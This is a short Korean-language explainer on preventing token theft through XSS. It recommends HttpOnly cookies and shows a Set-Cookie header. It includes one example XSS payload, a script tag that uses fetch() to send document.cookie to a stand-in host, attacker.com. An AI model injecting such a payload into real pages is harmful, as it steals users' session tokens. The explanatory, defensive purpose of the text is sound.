# 토큰 탈취 방지 전략 (XSS, CSRF)



## XSS (Cross-Site Scripting) 개념과 방어 전략

### XSS란?

XSS는 공격자가 웹 페이지에 악성 JavaScript 코드를 삽입해 사용자의 브라우저에서 실행시키는 공격 기법이다. 예를 들어, 게시판 댓글이나 검색창 같은 사용자 입력 영역에 악성 스크립트를 삽입하고, 이 코드가 다른 사용자에게 전달되면 **사용자의 쿠키, 토큰, 세션 정보 등을 탈취하거나, 악의적인 동작을 수행할 수 있다.**

공격 예시:

```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>
```

위와 같은 코드가 실행되면, 사용자의 인증 정보가 외부 서버로 전송될 수 있다.

### 방어 전략

 Content Security Policy (CSP) 설정, 사용자 입력 이스케이핑 및 검증, 외부 스크립트 관리 등 XSS를 막기위한 방어전략들이 있지만 해당 글에서는 토큰 방어 전략에 관한 것 만 작성

#### HttpOnly 쿠키 사용

- JavaScript에서 접근할 수 없도록 쿠키에 `HttpOnly` 속성을 부여
    
- XSS로 JS가 실행되더라도 `document.cookie`를 통해 토큰에 접근할 수 없음
    
- 즉, 악성 스크립트가 삽입되더라도 인증 토큰을 탈취할 수 없어 보안 수준 향상
    
- 브라우저만이 쿠키에 접근 가능하고, 서버로 전송되기 때문에 보안성이 높아짐
    

```http
Set-Cookie: access_token=...; HttpOnly; Secure; Path=/;
```
